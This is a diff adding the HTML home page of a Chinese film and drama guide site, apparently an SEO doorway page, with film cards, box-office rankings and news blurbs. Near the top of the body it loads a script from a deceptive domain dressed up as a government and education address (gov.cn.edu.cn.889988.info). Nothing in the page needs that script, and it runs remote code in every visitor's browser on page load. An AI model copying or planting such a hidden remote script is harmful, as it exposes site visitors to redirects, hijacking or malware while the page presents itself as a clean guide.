@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>87电影院·八七电影网 - 影片介绍/排片资讯/观影指南 | 87电影</title>
+<meta name="description" content="87电影院（八七电影网，87dianyingyuanbaqidianyingwang-top.github.io）提供电影介绍、热映排片、日韩剧集、票房排行榜与影视资讯。干净导览、移动端自适应，专注观影指南与片单推荐。">
+<meta name="keywords" content="87电影院,八七电影网,电影介绍,热映影片,剧集推荐,票房排行,观影指南,87dianyingyuanbaqidianyingwang-top">
+<meta name="msvalidate.01" content="YOUR_BING_VERIFICATION_CODE" />
+<link rel="canonical" href="https://87dianyingyuanbaqidianyingwang-top.github.io/" />
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;
+  background:#0b0b10;color:#e7e3da;line-height:1.65;overflow-x:hidden;
+}
+:root{
+  --red:#ff2e4d;--cyan:#36e0d0;--gold:#f4c152;--paper:#f3ead6;
+  --ink:#0b0b10;--card:#14141c;--line:rgba(255,255,255,.08);
+  --muted:#9a958a;--radius:16px;
+}
+/* 放映机光束背景 */
+.beam{position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.5;
+  background:
+    radial-gradient(1200px 400px at 80% -10%,rgba(255,46,77,.18),transparent 60%),
+    radial-gradient(900px 360px at 10% 110%,rgba(54,224,208,.14),transparent 60%);
+}
+.wrap{max-width:1200px;margin:0 auto;padding:0 20px;position:relative;z-index:1}
+
+/* Header */
+.header{position:sticky;top:0;z-index:1000;background:rgba(11,11,16,.85);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.nav{display:flex;align-items:center;justify-content:space-between;height:64px}
+.logo{display:flex;align-items:center;gap:12px;text-decoration:none;font-weight:900;font-size:1.25rem;color:#fff;letter-spacing:.5px}
+.ticket{width:38px;height:26px;border-radius:4px;background:var(--paper);color:var(--ink);display:flex;align-items:center;justify-content:center;font-size:.7rem;font-weight:900;position:relative}
+.ticket::before,.ticket::after{content:"";position:absolute;width:6px;height:6px;border-radius:50%;background:#0b0b10;top:50%;transform:translateY(-50%)}
+.ticket::before{left:-3px}.ticket::after{right:-3px}
+.logo b{color:var(--red)}
+.logo i{color:var(--cyan);font-style:normal}
+.menu{display:flex;gap:4px;list-style:none}
+.menu a{color:var(--muted);text-decoration:none;padding:8px 14px;font-size:.85rem;border-radius:8px;transition:.3s}
+.menu a:hover,.menu a.active{color:#fff;background:rgba(255,255,255,.06)}
+.ham{display:none;flex-direction:column;gap:4px;cursor:pointer}
+.ham span{width:22px;height:2px;background:#fff;border-radius:2px}
+
+/* Hero */
+.hero{padding:72px 0 54px}
+.hero-grid{display:grid;grid-template-columns:1.15fr .85fr;gap:40px;align-items:center}
+.kicker{display:inline-flex;gap:8px;align-items:center;font-size:.72rem;color:var(--cyan);border:1px solid rgba(54,224,208,.3);padding:5px 12px;border-radius:100px;margin-bottom:18px}
+.kicker .dot{width:6px;height:6px;border-radius:50%;background:var(--red);animation:pulse 1.8s infinite}
+@keyframes pulse{50%{opacity:.3}}
+.hero h1{font-size:3.1rem;line-height:1.12;color:#fff;margin-bottom:18px}
+.hero h1 em{font-style:normal;color:var(--red)}
+.hero h1 span{color:var(--gold)}
+.hero p{color:var(--muted);font-size:1rem;max-width:540px;margin-bottom:26px}
+.search{display:flex;max-width:480px;background:var(--card);border:1px solid var(--line);border-radius:100px;overflow:hidden}
+.search input{flex:1;background:transparent;border:none;outline:none;padding:14px 20px;color:#fff;font-size:.9rem}
+.search button{border:none;background:linear-gradient(135deg,var(--red),var(--gold));color:#1a1a1a;font-weight:800;padding:0 26px;cursor:pointer}
+.chips{display:flex;gap:8px;flex-wrap:wrap;margin-top:18px}
+.chips span{font-size:.72rem;color:var(--muted);border:1px solid var(--line);padding:4px 12px;border-radius:100px}
+/* 票根插画 */
+.reel{height:340px;border-radius:20px;background:
+  repeating-linear-gradient(90deg,rgba(255,255,255,.04) 0 10px,transparent 10px 26px),
+  linear-gradient(160deg,#1c1c26,#0e0e15);
+  border:1px solid var(--line);position:relative;overflow:hidden;display:flex;align-items:center;justify-content:center}
+.reel .big{font-size:5rem;filter:drop-shadow(0 0 24px rgba(255,46,77,.4))}
+.reel .strip{position:absolute;top:0;bottom:0;width:26px;background:
+  radial-gradient(circle, #0b0b10 4px, transparent 5px) 0 8px/26px 26px repeat-y,
+  rgba(255,255,255,.05)}
+.reel .strip.l{left:18px}.reel .strip.r{right:18px}
+.reel .tag{position:absolute;bottom:16px;left:50%;transform:translateX(-50%);font-size:.75rem;color:var(--gold);letter-spacing:3px}
+
+/* Section */
+.section{padding:56px 0}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;margin-bottom:26px;gap:16px;flex-wrap:wrap}
+.sec-head h2{font-size:1.5rem;color:#fff;display:flex;align-items:center;gap:10px}
+.sec-head h2::before{content:"";width:5px;height:22px;border-radius:3px;background:linear-gradient(var(--red),var(--gold))}
+.sec-head a{color:var(--cyan);text-decoration:none;font-size:.8rem;font-weight:600}
+.pills{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:22px}
+.pill{padding:7px 16px;border:1px solid var(--line);border-radius:100px;background:var(--card);color:var(--muted);font-size:.75rem;cursor:pointer;transition:.3s}
+.pill.active,.pill:hover{color:var(--ink);background:var(--gold);border-color:transparent;font-weight:700}
+
+/* Movie grid */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:18px}
+.card{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);overflow:hidden;transition:.35s}
+.card:hover{transform:translateY(-6px);border-color:rgba(255,46,77,.35);box-shadow:0 16px 36px rgba(0,0,0,.45)}
+.poster{height:280px;display:flex;align-items:center;justify-content:center;font-size:3rem;color:#fff;position:relative}
+.poster::after{content:"";position:absolute;inset:0;background:linear-gradient(transparent 55%,rgba(0,0,0,.5))}
+.badge{position:absolute;top:10px;left:10px;z-index:2;font-size:.65rem;font-weight:700;padding:3px 9px;border-radius:100px;background:rgba(0,0,0,.55);color:var(--gold);border:1px solid rgba(244,193,82,.4)}
+.card-body{padding:14px}
+.card-body h4{font-size:.95rem;color:#fff;margin-bottom:6px}
+.meta{display:flex;justify-content:space-between;font-size:.72rem;color:var(--muted)}
+.score{color:var(--red);font-weight:800}
+
+/* Rank */
+.rank-grid{display:grid;grid-template-columns:1fr 1fr;gap:22px}
+.rank-box{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);overflow:hidden}
+.rank-box h3{padding:14px 18px;border-bottom:1px solid var(--line);font-size:1rem;color:#fff}
+.rank-row{display:flex;align-items:center;gap:14px;padding:12px 18px;border-bottom:1px dashed var(--line)}
+.rank-row:last-child{border-bottom:none}
+.num{width:28px;height:28px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:.78rem;background:#1f1f2a;color:var(--muted)}
+.num.top{background:linear-gradient(135deg,var(--red),var(--gold));color:#1a1a1a}
+.r-info{flex:1}
+.r-info h4{font-size:.85rem;color:#fff}
+.r-info p{font-size:.7rem;color:var(--muted)}
+.bar{width:56px;height:5px;background:#1f1f2a;border-radius:3px;overflow:hidden}
+.bar i{display:block;height:100%;background:linear-gradient(90deg,var(--red),var(--cyan))}
+.r-score{font-size:.8rem;font-weight:800;color:var(--gold);min-width:34px;text-align:right}
+
+/* News */
+.news{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:18px}
+.news-card{display:flex;background:var(--card);border:1px solid var(--line);border-radius:var(--radius);overflow:hidden;transition:.3s}
+.news-card:hover{border-color:rgba(54,224,208,.4)}
+.news-date{min-width:74px;background:linear-gradient(160deg,var(--red),var(--gold));color:#1a1a1a;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:14px 6px;font-weight:800}
+.news-date small{font-size:.62rem;font-weight:700}
+.news-text{padding:14px 16px}
+.news-text h4{font-size:.9rem;color:#fff;margin-bottom:6px}
+.news-text p{font-size:.75rem;color:var(--muted);line-height:1.6}
+
+/* About */
+.about{background:var(--card);border:1px solid var(--line);border-radius:18px;padding:38px;display:grid;grid-template-columns:1.1fr .9fr;gap:36px;align-items:center}
+.about h3{font-size:1.35rem;color:#fff;margin-bottom:14px}
+.about h3 em{font-style:normal;color:var(--red)}
+.about p{color:var(--muted);font-size:.88rem;margin-bottom:12px}
+.feat{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:16px}
+.feat div{font-size:.78rem;color:#e7e3da;background:#1b1b25;padding:10px 12px;border-radius:10px;border:1px solid var(--line)}
+.info{border:1px solid var(--line);border-radius:14px;padding:22px;background:#101019}
+.info h4{font-size:.95rem;color:#fff;margin-bottom:14px}
+.row{display:flex;justify-content:space-between;padding:9px 0;border-bottom:1px dashed var(--line);font-size:.8rem}
+.row:last-child{border-bottom:none}
+.row dt{color:var(--muted)}
+.row dd{color:#fff;font-weight:700;text-align:right}
+
+/* Footer */
+.footer{margin-top:60px;border-top:1px solid var(--line);background:#08080c;color:#8d887e;padding:44px 0 22px}
+.foot{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:30px}
+.foot h3{color:#fff;font-size:1.1rem;margin-bottom:10px}
+.foot h4{color:#fff;font-size:.85rem;margin-bottom:12px}
+.foot p,.foot a{color:#8d887e;font-size:.76rem;text-decoration:none;line-height:1.8}
+.foot a:hover{color:var(--gold)}
+.disclaim{max-width:1200px;margin:0 auto 18px;padding:0 20px;font-size:.72rem;color:#6f6a61;line-height:1.7}
+.foot-bottom{text-align:center;margin-top:28px;padding-top:18px;border-top:1px solid rgba(255,255,255,.06);font-size:.7rem;color:#6f6a61}
+
+@media(max-width:992px){
+  .hero-grid{grid-template-columns:1fr}.reel{height:220px}
+  .rank-grid{grid-template-columns:1fr}
+  .about{grid-template-columns:1fr;gap:24px}
+  .foot{grid-template-columns:1fr 1fr}
+}
+@media(max-width:768px){
+  .menu{position:fixed;top:64px;left:0;right:0;background:#0b0b10;flex-direction:column;padding:18px;gap:4px;border-bottom:1px solid var(--line);transform:translateY(-120%);opacity:0;pointer-events:none;transition:.3s}
+  .menu.active{transform:translateY(0);opacity:1;pointer-events:all}
+  .ham{display:flex}
+  .hero h1{font-size:2rem}
+  .search{flex-direction:column;border-radius:14px}
+  .search input{border-bottom:1px solid var(--line)}
+  .search button{padding:12px}
+  .section{padding:40px 0}
+  .grid{grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:14px}
+  .poster{height:210px;font-size:2.2rem}
+  .news{grid-template-columns:1fr}
+  .news-card{flex-direction:column}
+  .news-date{flex-direction:row;gap:8px;min-width:auto;padding:10px}
+}
+@media(max-width:520px){
+  .hero h1{font-size:1.6rem}
+  .foot{grid-template-columns:1fr}
+  .about{padding:24px 16px}
+  .feat{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+<div class="beam"></div>
+
+<header class="header">
+  <div class="wrap nav">
+    <a href="#" class="logo"><span class="ticket">87</span> <b>87电影院</b>·<i>八七电影网</i></a>
+    <ul class="menu" id="menu">
+      <li><a href="#home" class="active">首页</a></li>
+      <li><a href="#movies">热映影片</a></li>
+      <li><a href="#drama">剧集剧场</a></li>
+      <li><a href="#rank">票房排行</a></li>
+      <li><a href="#news">影视资讯</a></li>
+      <li><a href="#about">关于八七</a></li>
+    </ul>
+    <div class="ham" id="ham"><span></span><span></span><span></span></div>
+  </div>
+</header>
+
+<section class="hero wrap" id="home">
+  <div class="hero-grid">
+    <div>
+      <div class="kicker"><span class="dot"></span> 排片资讯 · 片单导航 · 观影指南</div>
+      <h1>走进 <em>87电影院</em><br>看懂每一部 <span>好电影</span></h1>
+      <p>87电影院（八七电影网）不堆盗版链接，只做干净的事：电影介绍、热映排片、剧集盘点、票房解析和观影指南。手机端自适应，找片不晕。</p>
+      <form class="search" onsubmit="event.preventDefault();location.href='#'">
+        <input type="text" placeholder="搜电影 / 导演 / 演员 / 类型...">
+        <button type="submit">查排片</button>
+      </form>
+      <div class="chips">
+        <span># 热映大片</span><span># 文艺片</span><span># 悬疑犯罪</span><span># 动画家庭</span><span># 日韩剧</span>
+      </div>
+    </div>
+    <div class="reel">
+      <div class="strip l"></div>
+      <div class="big">🎟️</div>
+      <div class="strip r"></div>
+      <div class="tag">NOW SHOWING · 87 CINEMA</div>
+    </div>
+  </div>
+</section>
+
+<section class="section wrap" id="movies">
+  <div class="sec-head"><h2>热映影片</h2><a href="#">全部影片 →</a></div>
+  <div class="pills">
+    <span class="pill active">全部</span><span class="pill">动作</span><span class="pill">科幻</span><span class="pill">悬疑</span><span class="pill">动画</span><span class="pill">文艺</span><span class="pill">家庭</span>
+  </div>
+  <div class="grid">
+    <div class="card"><div class="poster" style="background:linear-gradient(135deg,#ff2e4d,#7a0f1d)"><span class="badge">热映</span>🎬</div><div class="card-body"><h4>城市焰火 (2025)</h4><div class="meta"><span>动作 / 国产</span><span class="score">8.4</span></div></div></div>
+    <div class="card"><div class="poster" style="background:linear-gradient(135deg,#36e0d0,#0b6b63)"><span class="badge">科幻</span>🎬</div><div class="card-body"><h4>第七号轨道 (2025)</h4><div class="meta"><span>科幻 / 合拍</span><span class="score">8.1</span></div></div></div>
+    <div class="card"><div class="poster" style="background:linear-gradient(135deg,#f4c152,#9a6b00)"><span class="badge">悬疑</span>🎬</div><div class="card-body"><h4>无声证词 (2024)</h4><div class="meta"><span>悬疑 / 犯罪</span><span class="score">8.6</span></div></div></div>
+    <div class="card"><div class="poster" style="background:linear-gradient(135deg,#7c5cff,#2a1d66)"><span class="badge">动画</span>🎬</div><div class="card-body"><h4>云上邮局 (2025)</h4><div class="meta"><span>动画 / 家庭</span><span class="score">8.3</span></div></div></div>
+    <div class="card"><div class="poster" style="background:linear-gradient(135deg,#ff7eb3,#7a1740)"><span class="badge">文艺</span>🎬</div><div class="card-body"><h4>晚风食堂 (2024)</h4><div class="meta"><span>文艺 / 治愈</span><span class="score">8.8</span></div></div></div>
+    <div class="card"><div class="poster" style="background:linear-gradient(135deg,#3b82f6,#0b2a66)"><span class="badge">剧情</span>🎬</div><div class="card-body"><h4>八十七号厅 (2025)</h4><div class="meta"><span>剧情 / 院线</span><span class="score">8.0</span></div></div></div>
+  </div>
+</section>
+
+<section class="section wrap" id="drama">
+  <div class="sec-head"><h2>剧集剧场</h2><a href="#">全部剧集 →</a></div>
+  <div class="grid">
+    <div class="card"><div class="poster" style="background:linear-gradient(135deg,#22223a,#0c0c16)">📺</div><div class="card-body"><h4>霓虹巷弄 (2025)</h4><div class="meta"><span>都市 / 12集</span><span class="score">8.7</span></div></div></div>
+    <div class="card"><div class="poster" style="background:linear-gradient(135deg,#3a0d0d,#120404)">📺</div><div class="card-body"><h4>刑侦八课 (2024)</h4><div class="meta"><span>刑侦 / 24集</span><span class="score">8.5</span></div></div></div>
+    <div class="card"><div class="poster" style="background:linear-gradient(135deg,#0d3a33,#03110f)">📺</div><div class="card-body"><h4>东京慢邮 (2025)</h4><div class="meta"><span>日剧 / 10集</span><span class="score">8.9</span></div></div></div>
+    <div class="card"><div class="poster" style="background:linear-gradient(135deg,#3a2a05,#120c01)">📺</div><div class="card-body"><h4>首尔便利店 (2024)</h4><div class="meta"><span>韩剧 / 16集</span><span class="score">8.4</span></div></div></div>
+  </div>
+</section>
+
+<section class="section wrap" id="rank">
+  <div class="sec-head"><h2>票房 / 口碑排行</h2><a href="#">完整榜单 →</a></div>
+  <div class="rank-grid">
+    <div class="rank-box">
+      <h3>🎟️ 本周票房榜</h3>
+      <div class="rank-row"><span class="num top">1</span><div class="r-info"><h4>城市焰火</h4><p>国产 / 动作</p></div><div class="bar"><i style="width:98%"></i></div><span class="r-score">9.8</span></div>
+      <div class="rank-row"><span class="num top">2</span><div class="r-info"><h4>第七号轨道</h4><p>合拍 / 科幻</p></div><div class="bar"><i style="width:94%"></i></div><span class="r-score">9.4</span></div>
+      <div class="rank-row"><span class="num top">3</span><div class="r-info"><h4>云上邮局</h4><p>动画 / 家庭</p></div><div class="bar"><i style="width:91%"></i></div><span class="r-score">9.1</span></div>
+      <div class="rank-row"><span class="num">4</span><div class="r-info"><h4>晚风食堂</h4><p>文艺 / 治愈</p></div><div class="bar"><i style="width:88%"></i></div><span class="r-score">8.8</span></div>
+      <div class="rank-row"><span class="num">5</span><div class="r-info"><h4>八十七号厅</h4><p>剧情 / 院线</p></div><div class="bar"><i style="width:85%"></i></div><span class="r-score">8.5</span></div>
+    </div>
+    <div class="rank-box">
+      <h3>⭐ 编辑部口碑榜</h3>
+      <div class="rank-row"><span class="num top">1</span><div class="r-info"><h4>无声证词</h4><p>悬疑 / 犯罪</p></div><div class="bar"><i style="width:96%"></i></div><span class="r-score">9.6</span></div>
+      <div class="rank-row"><span class="num top">2</span><div class="r-info"><h4>东京慢邮</h4><p>日剧 / 治愈</p></div><div class="bar"><i style="width:93%"></i></div><span class="r-score">9.3</span></div>
+      <div class="rank-row"><span class="num top">3</span><div class="r-info"><h4>晚风食堂</h4><p>文艺 / 美食</p></div><div class="bar"><i style="width:90%"></i></div><span class="r-score">9.0</span></div>
+      <div class="rank-row"><span class="num">4</span><div class="r-info"><h4>霓虹巷弄</h4><p>都市 / 群像</p></div><div class="bar"><i style="width:87%"></i></div><span class="r-score">8.7</span></div>
+      <div class="rank-row"><span class="num">5</span><div class="r-info"><h4>首尔便利店</h4><p>韩剧 / 日常</p></div><div class="bar"><i style="width:84%"></i></div><span class="r-score">8.4</span></div>
+    </div>
+  </div>
+</section>
+
+<section class="section wrap" id="news">
+  <div class="sec-head"><h2>影视资讯</h2><a href="#">更多资讯 →</a></div>
+  <div class="news">
+    <div class="news-card"><div class="news-date"><b>22</b><small>OCT</small></div><div class="news-text"><h4>国庆档后劲不足？87电影院盘点真正留住观众的 5 部</h4><p>不是特效最响的赢，而是情绪最稳的赢。本期从排片、上座率、口碑曲线三条线看国庆后市场。</p></div></div>
+    <div class="news-card"><div class="news-date"><b>19</b><small>OCT</small></div><div class="news-text"><h4>动画电影回春：为什么成年人也开始看“云上邮局”</h4><p>家庭动画不再只是儿童票仓，治愈、乡愁、城市孤独成了新卖点，本文拆开来说。</p></div></div>
+    <div class="news-card"><div class="news-date"><b>16</b><small>OCT</small></div><div class="news-text"><h4>悬疑片怎么拍不腻？《无声证词》的 3 个叙事陷阱</h4><p>反转不是越多越好。我们从视角、证物、时间线三个角度，讲一部好悬疑片的底盘。</p></div></div>
+    <div class="news-card"><div class="news-date"><b>13</b><small>OCT</small></div><div class="news-text"><h4>日韩短剧走红：10 集讲完，反而更贵</h4><p>长剧注水被厌弃，10–12 集精品制造成趋势。87电影院整理一份“短剧入门片单”。</p></div></div>
+  </div>
+</section>
+
+<section class="section wrap" id="about">
+  <div class="about">
+    <div>
+      <h3>关于 <em>87电影院 · 八七电影网</em></h3>
+      <p>87电影院（八七电影网）是一个电影/剧集内容导览站：做影片介绍、排片资讯、票房盘点、剧集推荐和观影指南，不托管、不上传、不解析未授权影视文件。</p>
+      <p>我们想让“今天看什么”这件事变简单：首屏能搜，栏目能逛，排行榜能决策，资讯能看懂。</p>
+      <div class="feat">
+        <div>🎟️ 影片介绍</div>
+        <div>🎞️ 排片资讯</div>
+        <div>📊 票房/口碑榜</div>
+        <div>📱 移动端自适应</div>
+      </div>
+    </div>
+    <div class="info">
+      <h4>站点信息</h4>
+      <div class="row"><dt>网站名称</dt><dd>87电影院 / 八七电影网</dd></div>
+      <div class="row"><dt>网站地址</dt><dd>87dianyingyuanbaqidianyingwang-top.github.io</dd></div>
+      <div class="row"><dt>内容方向</dt><dd>电影 / 剧集 / 票房 / 资讯</dd></div>
+      <div class="row"><dt>站点定位</dt><dd>影视内容导览与指南</dd></div>
+      <div class="row"><dt>更新方式</dt><dd>片单 + 排行 + 资讯</dd></div>
+    </div>
+  </div>
+</section>
+
+<footer class="footer">
+  <div class="wrap">
+    <div class="disclaim">
+      免责声明：87电影院（八七电影网）为影视内容导览与资讯示例站，仅提供影片介绍、排片信息、片单推荐与观影指南；不托管、不上传、不存储、不解析未授权影视资源。如链接指向第三方平台，内容版权归原始权利人所有，用户需自行判断第三方平台合规性与安全性。
+    </div>
+    <div class="foot">
+      <div>
+        <h3>87电影院 · 八七电影网</h3>
+        <p>走进 87 号厅，看懂每一部好电影。电影介绍、热映排片、剧集盘点、票房解析，一个页面逛完。</p>
+      </div>
+      <div>
+        <h4>导航</h4>
+        <p><a href="#home">首页</a><br><a href="#movies">热映影片</a><br><a href="#drama">剧集剧场</a><br><a href="#rank">票房排行</a></p>
+      </div>
+      <div>
+        <h4>内容</h4>
+        <p><a href="#">影片解析</a><br><a href="#">导演合集</a><br><a href="#">类型片单</a><br><a href="#">观影指南</a></p>
+      </div>
+      <div>
+        <h4>关于</h4>
+        <p><a href="#about">关于八七</a><br><a href="#">版权说明</a><br><a href="#">侵权投诉</a><br><a href="#">隐私政策</a></p>
+      </div>
+    </div>
+    <div class="foot-bottom">
+      © 2024 87电影院·八七电影网（87dianyingyuanbaqidianyingwang-top.github.io）· 影视内容导览示例 · Powered by 87 Cinema
+    </div>
+  </div>
+</footer>
+
+<script>
+const ham=document.getElementById('ham'),menu=document.getElementById('menu');
+ham.addEventListener('click',()=>menu.classList.toggle('active'));
+menu.querySelectorAll('a').forEach(a=>a.addEventListener('click',()=>menu.classList.remove('active')));
+const secs=[...document.querySelectorAll('section[id]')],links=[...menu.querySelectorAll('a')];
+addEventListener('scroll',()=>{let cur='';secs.forEach(s=>{if(scrollY>=s.offsetTop-120)cur=s.id});links.forEach(a=>a.classList.toggle('active',a.getAttribute('href')==='#'+cur))});
+document.querySelectorAll('.pill').forEach(p=>p.addEventListener('click',()=>{document.querySelectorAll('.pill').forEach(x=>x.classList.remove('active'));p.classList.add('active')}));
+</script>
+</body>
+</html>
